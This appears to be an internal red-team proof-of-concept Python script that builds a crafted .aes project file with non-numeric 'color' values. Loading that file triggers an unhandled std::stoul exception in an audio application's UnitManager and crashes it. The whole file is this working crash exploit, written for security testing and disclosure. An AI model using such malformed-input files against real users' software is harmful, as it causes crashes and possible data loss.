#!/usr/bin/env python3
"""
Red Team PoC — SEC-RTM-003: UnitManager std::stoul Crash via Crafted .aes
Target: UnitManager.cpp:300  std::stoul(ju["color"].asString())
Impact: Crash on project load — no try/catch around stoul
Difficulty: Script Kiddie
"""
import json, sys, os

def build_malicious_aes():
    """
    Builds a minimal .aes project payload containing malformed color fields intended to trigger numeric parsing errors.
    
    The returned dictionary represents a minimal project with top-level keys: `version`, `tempo`, `playhead`, `lanes`, `sources`, `patterns`, and `arsenal`. One lane and one arsenal unit are included; both have their `color` fields set to the string "not_a_number".
    
    Returns:
        dict: Project data ready for JSON serialization. The `lanes[0]["color"]` and `arsenal["units"][0]["color"]` entries contain the malformed string "not_a_number".
    """
    return {
        "version": 1,
        "tempo": 120.0,
        "playhead": 0.0,
        "lanes": [
            {
                "name": "Channel 1",
                "color": "not_a_number",  # ← TRIGGER: std::stoul throws
                "volume": 1.0,
                "pan": 0.0,
                "automation": [],
                "clips": []
            }
        ],
        "sources": [],
        "patterns": [],
        "arsenal": {
            "units": [
                {
                    "id": 1,
                    "name": "Rumble",
                    "pluginId": "com.Aestrastudios.rumble",
                    "color": "not_a_number",  # ← TRIGGER: std::stoul(ju["color"])
                    "enabled": True,
                    "pluginStateHex": ""
                }
            ],
            "nextId": 2
        }
    }

def main():
    """
    Write a crafted .aes JSON project (with malformed `color` fields) to a file and print the output path, size, and informational messages.
    
    The output filename is taken from the first command-line argument if present; otherwise it defaults to "poc_stoul_crash.aes". Builds the malicious project via build_malicious_aes(), writes it as indented JSON, then prints the filename and byte size followed by fixed informational lines describing the targeted crash location.
    """
    output = sys.argv[1] if len(sys.argv) > 1 else 'poc_stoul_crash.aes'
    project = build_malicious_aes()
    with open(output, 'w') as f:
        json.dump(project, f, indent=2)
    print(f"[+] PoC: {output} ({os.path.getsize(output)} bytes)")
    print("[+] UnitManager.cpp:300 → std::stoul(\"not_a_number\") → std::invalid_argument → crash")
    print("[+] Note: ProjectSerializer.cpp:628 has try/catch, but UnitManager.cpp:300 does NOT")

if __name__ == '__main__':
    main()
